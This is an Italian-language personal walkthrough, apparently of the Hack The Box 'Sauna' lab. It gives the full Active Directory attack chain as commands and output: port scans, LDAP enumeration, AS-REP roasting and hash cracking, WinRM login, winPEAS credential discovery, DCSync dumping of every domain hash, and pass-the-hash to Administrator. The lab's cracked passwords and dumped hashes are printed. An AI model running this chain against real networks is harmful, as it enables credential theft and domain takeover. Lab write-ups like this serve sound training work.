@@ -1,0 +1,429 @@
+10.10.10.175
+
+sudo masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.175
+
+
+Discovered open port 3269/tcp on 10.10.10.175
+Discovered open port 88/tcp on 10.10.10.175
+Discovered open port 135/tcp on 10.10.10.175
+Discovered open port 49667/tcp on 10.10.10.175
+Discovered open port 464/tcp on 10.10.10.175
+Discovered open port 9389/tcp on 10.10.10.175
+Discovered open port 49689/tcp on 10.10.10.175
+Discovered open port 49673/tcp on 10.10.10.175
+Discovered open port 49674/tcp on 10.10.10.175
+Discovered open port 389/tcp on 10.10.10.175
+Discovered open port 49677/tcp on 10.10.10.175
+Discovered open port 53/tcp on 10.10.10.175
+Discovered open port 49696/tcp on 10.10.10.175
+Discovered open port 5985/tcp on 10.10.10.175
+Discovered open port 3268/tcp on 10.10.10.175
+Discovered open port 139/tcp on 10.10.10.175
+Discovered open port 593/tcp on 10.10.10.175
+Discovered open port 445/tcp on 10.10.10.175
+Discovered open port 80/tcp on 10.10.10.175
+Discovered open port 636/tcp on 10.10.10.175
+
+
+nmap -sC -sV -p3269,88,135,49667,464,9389,49689,49673,49674,389,49677,53,49696,5985,3268,139,593,445,80,636 10.10.10.175
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-04 17:51:27Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h02m20s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2021-12-04T17:52:24
+|_  start_date: N/A
+
+nslookup
+  >server 10.10.10.175
+  >
+
+
+dig -x 10.10.10.175 +all @10.10.10.175
+
+non trovo host particolari
+
+provo a controllare il sito sulla porta 80
+c'è un sito di una banca: egotistical bank
+
+se provo a fare apply now e inserire alcune info mi esce il messaggio:
+
+405 - HTTP verb used to access this page is not allowed.
+
+posso provare con burp a usare un altro metodo
+
+con GET funziona ma non sembra esserci nulla di inteeerssante, provo con gobuster
+
+sudo gobuster  dir -u http://10.10.10.175/ -w /usr/share/wordlists/dirb/big.txt -t 200
+
+nulla di interessante
+
+
+
+
+provo con LDAP
+
+ldapsearch -h 10.10.10.175 -x -s base namingcontexts                                                                                                                                                                                250 ⨯
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts
+#
+
+#
+dn:
+namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+
+
+
+
+ldapsearch -h 10.10.10.175 -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
+# extended LDIF
+#
+# LDAPv3
+# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# EGOTISTICAL-BANK.LOCAL
+dn: DC=EGOTISTICAL-BANK,DC=LOCAL
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
+instanceType: 5
+whenCreated: 20200123054425.0Z
+whenChanged: 20211204170104.0Z
+subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
+subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+uSNCreated: 4099
+dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
+uSNChanged: 98336
+name: EGOTISTICAL-BANK
+objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
+replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAM8vv
+ BcDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
+ AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
+ TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==
+creationTime: 132831108648992462
+forceLogoff: -9223372036854775808
+lockoutDuration: -18000000000
+lockOutObservationWindow: -18000000000
+lockoutThreshold: 0
+maxPwdAge: -36288000000000
+minPwdAge: -864000000000
+minPwdLength: 7
+modifiedCountAtLastProm: 0
+nextRid: 1000
+pwdProperties: 1
+pwdHistoryLength: 24
+objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
+serverState: 1
+uASCompat: 1
+modifiedCount: 1
+auditingPolicy:: AAE=
+nTMixedDomain: 0
+rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
+ ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+systemFlags: -1946157056
+wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
+ ISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
+ m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
+ TISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
+ cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
+ EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
+ GOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
+ TISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
+ AL-BANK,DC=LOCAL
+wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
+ DC=EGOTISTICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
+ TICAL-BANK,DC=LOCAL
+wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
+ L-BANK,DC=LOCAL
+objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
+ C=LOCAL
+isCriticalSystemObject: TRUE
+gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
+ m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
+dSCorePropagationData: 16010101000000.0Z
+otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
+ TICAL-BANK,DC=LOCAL
+otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
+ e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
+ =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+ms-DS-MachineAccountQuota: 10
+msDS-Behavior-Version: 7
+msDS-PerUserTrustQuota: 1
+msDS-AllUsersTrustQuota: 1000
+msDS-PerUserTrustTombstonesQuota: 10
+msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
+ me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
+ ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
+msDS-NcType: 0
+msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
+dc: EGOTISTICAL-BANK
+
+# Users, EGOTISTICAL-BANK.LOCAL
+dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Computers, EGOTISTICAL-BANK.LOCAL
+dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Domain Controllers, EGOTISTICAL-BANK.LOCAL
+dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# System, EGOTISTICAL-BANK.LOCAL
+dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# LostAndFound, EGOTISTICAL-BANK.LOCAL
+dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Infrastructure, EGOTISTICAL-BANK.LOCAL
+dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
+dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Program Data, EGOTISTICAL-BANK.LOCAL
+dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
+dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
+dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Keys, EGOTISTICAL-BANK.LOCAL
+dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# TPM Devices, EGOTISTICAL-BANK.LOCAL
+dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Builtin, EGOTISTICAL-BANK.LOCAL
+dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# Hugo Smith, EGOTISTICAL-BANK.LOCAL
+dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
+
+# search reference
+ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
+ ICAL-BANK,DC=LOCAL
+
+# search reference
+ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
+ ICAL-BANK,DC=LOCAL
+
+# search reference
+ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
+ AL
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 19
+# numEntries: 15
+# numReferences: 3
+
+
+
+
+visto che anche cpon vari tentativi(crackmapexec,smb,ldap ecc) non riesco ad ottenere info utili e visto che il sito non permette nessun accesso
+posso solo provare a indovinare qualche username sperando che non richieda pre-authentication cosi da ottenere un hash per la sua pwd tramite impacket
+
+posso partire da una lista di nomi presente sul sito:
+
+Fergus Smith
+Hugo Bear
+Shaun Coins
+Bowie Taylor
+Sophie Driver
+Steven Kerb
+
+e poi posso usare https://github.com/urbanadventurer/username-anarchy per ottenere una lista di potenziali usernames
+
+./username-anarchy -i /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/nomi_sito.txt -f first,firstlast,lfirst,flast,f.last,l.first > /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/generated_usernames.txt
+
+ho ottenuto una lista di possibili usernames a cui aggiungo guest, administrator perchè solitamente sono presenti in active directory/ldap
+
+ora posso provare ad usare lo script di impacket
+
+python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format hashcat
+
+per ottenere i TGT da crackare se lo lancio così:
+
+python3 GetNPUsers.py -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -format hashcat
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+No entries found!
+
+non mi da risultati quindi devo passargli lo username preciso per vedere se riesco ad ottenere TGT
+
+python3 GetNPUsers.py -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -no-pass -usersfile /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/generated_usernames.txt -format hashcat
+
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d16ffa402930823f3b37b633420145d9$3d3059e5b1137fc2476de2e742db578a28909d1a688419d488be301666250e8d7fc735de35f7a3b98969486d556541e10bab5fabf3cf06c3ae579e0a6fb3ad2bbca1cb21f815df7bac4acc46aeb508a75fbf3beaab8779867a95e10de8f65ea4d957161446b519d3b4a967ed75df1f5dbbaa0829a472d57fb63909cf127a04cf1e9144b42acb1ff7ea2a52f5bda19171e8ea5eeffbe79caee4cdb2e264cf7383be3e2a95ac831f847b4a8c8a4cbdf7554d41b1bd29a568ef43b551bd84e5cf811ec328a1417556bcca2422ce49a476d6b41404cca3e71e870f45a24f5f0de22ff895960758b223886bd783d3eb87018e0728f5e665f9757c9b6d7889e5261363
+
+
+ho ottenuto un TGT che posso provare a crackare con hashcat
+
+
+
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:d16ffa402930823f3b37b633420145d9$3d3059e5b1137fc2476de2e742db578a28909d1a688419d488be301666250e8d7fc735de35f7a3b98969486d556541e10bab5fabf3cf06c3ae579e0a6fb3ad2bbca1cb21f815df7bac4acc46aeb508a75fbf3beaab8779867a95e10de8f65ea4d957161446b519d3b4a967ed75df1f5dbbaa0829a472d57fb63909cf127a04cf1e9144b42acb1ff7ea2a52f5bda19171e8ea5eeffbe79caee4cdb2e264cf7383be3e2a95ac831f847b4a8c8a4cbdf7554d41b1bd29a568ef43b551bd84e5cf811ec328a1417556bcca2422ce49a476d6b41404cca3e71e870f45a24f5f0de22ff895960758b223886bd783d3eb87018e0728f5e665f9757c9b6d7889e5261363:Thestrokes23
+
+Thestroke23 è la pwd
+
+
+provo ad acceder alla macchina con crackmapexec
+
+crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23
+
+non mi fa accedere
+
+porovo allora ad accedere con evil-winrm
+
+evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
+
+
+*Evil-WinRM* PS C:\Users\FSmith\Documents>
+
+*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
+143b110c7d99783d6f6067473ca68300
+
+
+
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        1/25/2020   1:05 PM                Administrator
+d-----        1/23/2020   9:52 AM                FSmith
+d-r---        1/22/2020   9:32 PM                Public
+d-----        1/24/2020   4:05 PM                svc_loanmgr
+
+
+//a questo punto si potrebbe usare winpeas per automatizzare enumeration
+
+lo carico sfruttando winrm direttamente
+
+upload /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/winPEASx64.exe
+Info: Uploading /home/daerves/Scrivania/git/SecNotes/htb/active_directory_101/2_sauna/winPEASx64.exe to C:\Users\FSmith\Documents\winPEASx64.exe
+
+.\winPEASx64.exe
+
+Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+posso accedere come svc_loanmanager:Moneymakestheworldgoround!        --> l'utente si chiama svc_loanmgr come visto nelle directory sotto users, la pwd funziona
+
+./evil-winrm.rb -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+
+e posso controllare se ha privilegi piu elevati
+
+non trovo nulla di particolare quindi provo ad usare bloodhound
+
+analizzando l'output sembra che svn_loanmgr abbia diritti di DCDync quindi posso usarlo direttamente epr ottener gli hash delle pwd e accedere con pass the hash
+
+sudo python3 secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175                       2 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:9e046eb16e74f79603bfa3d4faf46b73:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:180c104434637498921c9f9b4c8585f83715ffdf0af693722f12dcbe48ae2b91
+SAUNA$:aes128-cts-hmac-sha1-96:50d98524584be753fc3111791025610d
+SAUNA$:des-cbc-md5:e98cda3e613279ad
+
+
+sudo python3 psexec.py -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175
+
+C:\Users\Administrator\Desktop>type root.txt
+eaaa6b7d2e8fbc8e2a5ed54536325bd6
